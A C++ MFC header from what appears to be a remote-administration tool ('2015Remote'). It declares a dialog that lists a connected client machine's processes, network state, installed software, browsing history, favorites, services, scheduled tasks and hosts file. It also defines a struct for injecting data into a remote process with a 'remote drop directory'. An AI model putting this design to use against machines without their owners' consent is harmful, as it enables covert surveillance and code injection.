#include "stdafx.h"

#pragma once
#include <2015RemoteDlg.h>

/////////////////////////////////////////////////////////////////////////////
// CMachineDlg dialog

// TODO: 实现IP获取.
#include "common/location.h"


class CMachineDlg : public DialogBase
{
public:
    CMachineDlg(CWnd* pParent = NULL, Server* pIOCPServer = NULL, ClientContext* pContext = NULL);
    ~CMachineDlg();

    enum { IDD = IDD_MACHINE };
    CListCtrl   m_list;
    CTabCtrl    m_tab;

    void OnReceiveComplete();
    static int CALLBACK CompareFunction(LPARAM lParam1, LPARAM lParam2, LPARAM lParamSort);

protected:
    virtual void DoDataExchange(CDataExchange* pDX);
    afx_msg void OnClose();
    virtual BOOL OnNotify(WPARAM wParam, LPARAM lParam, LRESULT* pResult);

    int                 m_nSortedCol;
    bool                m_bAscending;
    bool                m_bIsReceiving;
    CMy2015RemoteDlg*   m_pMainWnd;
    CStatusBar          m_wndStatusBar;
    IPConverter*        m_IPConverter;
    CLocker             m_Locker;
    bool IsReceivingData() {
        m_Locker.Lock();
        auto r = m_bIsReceiving;
        m_Locker.Unlock();
        return r;
    }
    void SetReceivingStatus(bool b) {
		m_Locker.Lock();
		m_bIsReceiving = b;
		m_Locker.Unlock();
    }
    virtual BOOL OnInitDialog();
    afx_msg void OnSize(UINT nType, int cx, int cy);
    afx_msg void OnDblclkList(NMHDR* pNMHDR, LRESULT* pResult);
    afx_msg void OnRclickList(NMHDR* pNMHDR, LRESULT* pResult);
    afx_msg void OnSelChangeTab(NMHDR* pNMHDR, LRESULT* pResult);
    afx_msg void OnSelChangingTab(NMHDR* pNMHDR, LRESULT* pResult);
    afx_msg LRESULT OnShowMessage(WPARAM wParam, LPARAM lParam);
    afx_msg LRESULT OnWaitMessage(WPARAM wParam, LPARAM lParam);
    void SortColumn(int iCol, bool bAsc);
    CString oleTime2Str(double time);
    void reflush();

    DECLARE_MESSAGE_MAP()
public:
    void SendToken(BYTE bToken);
    void AdjustList();
    void OpenInfoDlg();
    void SetClipboardText(CString& Data);
    CString __MakePriority(DWORD dwPriClass);
    void DeleteList();
    void ShowProcessList(); //进程
    void ShowWindowsList();//窗口
    void ShowNetStateList();//网络
    void ShowSoftWareList();//软件列表
    void ShowIEHistoryList();//浏览记录
    void ShowFavoritesUrlList();//收藏夹
    void ShowServiceList(); //服务
    void ShowTaskList();//计划任务
    void ShowHostsList();//HOSTS

    //对应菜单
    void ShowProcessList_menu(); //进程
    void ShowWindowsList_menu();//窗口
    void ShowNetStateList_menu();//网络
    void ShowSoftWareList_menu();//软件列表
    void ShowIEHistoryList_menu();//浏览记录
    void ShowFavoritesUrlList_menu();//收藏夹
    void ShowServiceList_menu();//服务
    void ShowTaskList_menu();//计划任务
    void ShowHostsList_menu();//HOSTS
};

struct  Browsinghistory {
    TCHAR strTime[100];
    TCHAR strTitle[1024];
    TCHAR strUrl[1024];
};

struct  InjectData {
    DWORD ExeIsx86;
    DWORD mode;		        //注入模式
    DWORD dwProcessID;      //进程ID
    DWORD datasize;         //本地数据尺寸
    TCHAR strpath[1024];    //远程落地目录
};
